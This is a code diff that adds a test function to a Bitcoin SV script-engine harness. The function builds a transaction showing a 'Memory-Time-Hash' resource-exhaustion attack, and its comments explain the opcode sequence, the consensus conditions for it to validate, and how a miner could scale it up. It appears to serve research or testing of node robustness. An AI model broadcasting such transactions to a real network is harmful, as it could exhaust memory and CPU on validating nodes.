@@ -186,6 +186,7 @@ CScript PushAll(const std::vector<valtype>& values) {
 
 bsv::CMutableTransactionExtended BuildReguarTransaction(const std::string& network);
 bsv::CMutableTransactionExtended BuildP2SHTransaction(const std::string& network);
+bsv::CMutableTransactionExtended BuildNum2BinTransaction(const std::string& network);
 
 // This helper is to play and modify script pubkey (append op_code to that)
 // Here is the example of using OP_RETURN, but we can do other things
@@ -201,15 +202,17 @@ int main(int argc, char* argv[])
     bsv::CScriptEngine se(network);
 
     //const bsv::CMutableTransactionExtended eTX = BuildReguarTransaction(network);
-    const bsv::CMutableTransactionExtended eTX = BuildP2SHTransaction(network);
-    
+    //const bsv::CMutableTransactionExtended eTX = BuildP2SHTransaction(network);
+    const bsv::CMutableTransactionExtended eTX = BuildNum2BinTransaction(network);
+
     CDataStream out_stream(SER_NETWORK, PROTOCOL_VERSION);
     out_stream << eTX;
     const std::vector<uint8_t> etxBin(out_stream.begin(), out_stream.end());
-    std::array<int32_t, 1> utxoArray = { 520539 };
-    const int32_t blockHeight = 820540;
+    std::array<int32_t, 1> utxoArray = { 620539 };
+    const int32_t blockHeight = 720540;
+    const bool consensus {true};
 
-    const ScriptError ret = se.VerifyScript(etxBin, std::span<const int32_t>(utxoArray) , blockHeight, false);
+    const ScriptError ret = se.VerifyScript(etxBin, std::span<const int32_t>(utxoArray) , blockHeight, consensus);
 
     const std::string etxHex = bsv::Bin2Hex(etxBin);
     std::cout << std::endl << std::endl << "ExtendedTX Hex" << std::endl << std::endl << etxHex << std::endl << std::endl;
@@ -254,6 +257,124 @@ bsv::CMutableTransactionExtended BuildReguarTransaction(const std::string& netwo
     bsv::CMutableTransactionExtended eTX;
     eTX.vutxo = txFrom.vout;
     eTX.mtx = txTo;
+    return eTX;
+}
+
+// BuildNum2BinTransaction demonstrates the MTH (Memory-Time-Hash) attack pattern.
+//
+// MTH = Memory, Time, Hash: each OP_NUM2BIN call allocates a large buffer (Memory),
+// which is then hashed by a cryptographic opcode (Time + Hash), then freed. The script
+// is deliberately valid and verifies successfully — the attack lies in the excessive
+// resource cost imposed on every validating node.
+//
+// --- Transaction structure ---
+//
+//   Funding tx (txCredit):
+//     Inputs : 1 (coinbase-style, no real UTXO needed for testing)
+//     Outputs: 1  →  scriptPubKey = MTH locking script (see below)
+//
+//   Spending tx (txSpend):
+//     Inputs : 1  →  spends output 0 of txCredit
+//                    scriptSig = [32-byte input data] [NUM2BIN_SIZE as script number]
+//     Outputs: 1  →  empty scriptPubKey (value returned to self)
+//
+// --- Locking script (scriptPubKey) opcodes ---
+//
+//   Stack on entry (bottom → top): [ data(32 bytes) | NUM2BIN_SIZE ]
+//
+//   OP_DUP          main=[ data | size | size ]        alt=[]
+//                   -- duplicate size so one copy can be saved and one consumed
+//   OP_TOALTSTACK   main=[ data | size ]               alt=[ size ]
+//                   -- save one copy to altstack; the other copy stays on main
+//   OP_NUM2BIN      main=[ blob(NUM2BIN_SIZE) ]        alt=[ size ]
+//                   -- consumes [ data | size ] from main, expands data to size bytes
+//                   -- (1st large allocation: NUM2BIN_SIZE bytes)
+//   OP_RIPEMD160    main=[ hash1(20) ]                 alt=[ size ]
+//                   -- hashes the large buffer → 20 bytes (large buffer freed)
+//   OP_FROMALTSTACK main=[ hash1(20) | size ]          alt=[]
+//                   -- bring size back from altstack
+//   OP_DUP          main=[ hash1(20) | size | size ]   alt=[]
+//                   -- again duplicate size: one for altstack, one for OP_NUM2BIN
+//   OP_TOALTSTACK   main=[ hash1(20) | size ]          alt=[ size ]
+//   OP_NUM2BIN      main=[ blob(NUM2BIN_SIZE) ]        alt=[ size ]
+//                   -- consumes [ hash1(20) | size ], expands hash1 to size bytes
+//                   -- (2nd large allocation: NUM2BIN_SIZE bytes)
+//   OP_SHA1         main=[ hash2(20) ]                 alt=[ size ]
+//                   -- hashes the large buffer → 20 bytes (large buffer freed)
+//   OP_FROMALTSTACK main=[ hash2(20) | size ]          alt=[]
+//   OP_NUM2BIN      main=[ blob(NUM2BIN_SIZE) ]        alt=[]
+//                   -- consumes [ hash2(20) | size ], expands hash2 to size bytes
+//                   -- (3rd large allocation: NUM2BIN_SIZE bytes)
+//                   -- note: no DUP/TOALTSTACK needed, size is used and not reused after
+//   OP_SHA256       main=[ hash3(32) ]                 alt=[]
+//                   -- hashes the large buffer → 32 bytes (large buffer freed)
+//   <4> OP_SPLIT    main=[ first4 | remaining28 ]      alt=[]
+//   OP_DROP         main=[ first4 ]                    alt=[]
+//   OP_0NOTEQUAL    main=[ 1 (true) ]                  alt=[]
+//                   -- any real SHA256 output has non-zero first 4 bytes → script passes
+//
+//   Total memory peak:  1 × NUM2BIN_SIZE  (allocations are sequential, not simultaneous)
+//   Total hashing work: 3 × NUM2BIN_SIZE bytes of data hashed
+//
+// --- Conditions required for the transaction to pass verification ---
+//
+//   utxoHeight  >= 620539  : UTXO must be post-Genesis so OP_NUM2BIN is not disabled.
+//                            BSV Genesis activated on mainnet at height 620538.
+//   blockHeight >= 620539  : Spending block must also be post-Genesis.
+//   consensus   = true     : Must use block-validation mode (consensus=true in the BDK
+//                            wrapper). With consensus=false the engine runs IsStandardTx,
+//                            which rejects the TX_NONSTANDARD scriptPubKey before the
+//                            script even executes.
+//
+// --- What the attack looks like ---
+//
+//   The transaction verifies with SCRIPT_ERR_OK. There is no error.
+//   The resource cost is the attack:
+//     - Each OP_NUM2BIN allocates NUM2BIN_SIZE bytes inside the script interpreter.
+//     - Each following hash opcode (RIPEMD160 / SHA1 / SHA256) processes that entire
+//       buffer, consuming CPU proportional to NUM2BIN_SIZE.
+//     - A single 25-byte scriptPubKey + 36-byte scriptSig can force ~3 × NUM2BIN_SIZE
+//       bytes of hashing work on every node that validates the block.
+//     - At consensus level the stack size limit is INT64_MAX, so there is no bound on
+//       how large NUM2BIN_SIZE can be (up to INT32_MAX ≈ 2 GB per call).
+//     - A miner can include many such transactions in a block, multiplying the effect
+//       across all parallel validation threads simultaneously.
+bsv::CMutableTransactionExtended BuildNum2BinTransaction(const std::string& network)
+{
+    SelectParams(network, std::nullopt);
+
+    // -------------------------------------------------------------------------
+    // NUM2BIN_SIZE: the number of bytes each OP_NUM2BIN call will allocate.
+    // Change this value to adjust the memory/CPU cost per validation.
+    //   1'000'000  =   1 MB per allocation,  ~3 MB total hashing work  (safe for testing)
+    //  10'000'000  =  10 MB per allocation,  ~30 MB total hashing work (dangerous: can OOM)
+    // -------------------------------------------------------------------------
+    const int64_t NUM2BIN_SIZE = 1'000'000; // 1 MB
+
+    // Locking script (scriptPubKey): placed on the UTXO output being created.
+    // Spending this output requires pushing [data, NUM2BIN_SIZE] in the scriptSig.
+    CScript scriptPubKey;
+    scriptPubKey << OP_DUP << OP_TOALTSTACK
+                 << OP_NUM2BIN << OP_RIPEMD160
+                 << OP_FROMALTSTACK << OP_DUP << OP_TOALTSTACK
+                 << OP_NUM2BIN << OP_SHA1
+                 << OP_FROMALTSTACK << OP_NUM2BIN << OP_SHA256
+                 << CScriptNum(4) << OP_SPLIT << OP_DROP << OP_0NOTEQUAL;
+
+    const Amount nValue{1000000};
+    CMutableTransaction txCredit = BuildCreditingTransaction(scriptPubKey, nValue);
+
+    // Unlocking script (scriptSig): pushes the 32-byte input data and the target size.
+    // Any 32-byte value works as input data; we use 0x42 repeated.
+    std::vector<uint8_t> inputData(32, 0x42);
+    CScript scriptSig;
+    scriptSig << inputData << CScriptNum(NUM2BIN_SIZE);
+
+    CMutableTransaction txSpend = BuildSpendingTransaction(scriptSig, txCredit);
+
+    bsv::CMutableTransactionExtended eTX;
+    eTX.vutxo = txCredit.vout;
+    eTX.mtx   = txSpend;
     return eTX;
 }
 
